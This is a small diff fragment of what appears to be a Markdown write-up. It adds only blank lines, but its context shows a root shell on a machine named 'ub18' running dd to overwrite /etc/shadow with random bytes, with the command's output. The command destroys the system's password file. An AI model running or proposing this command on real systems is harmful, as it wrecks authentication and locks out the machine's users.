@@ -32,3 +32,5 @@ root@ub18:/home/victim# dd if=/dev/urandom of=/etc/shadow bs=1 count=2000
 2000 bytes (2.0 kB, 2.0 KiB) copied, 0.0226098 s, 88.5 kB/s
 
 ```
+
+
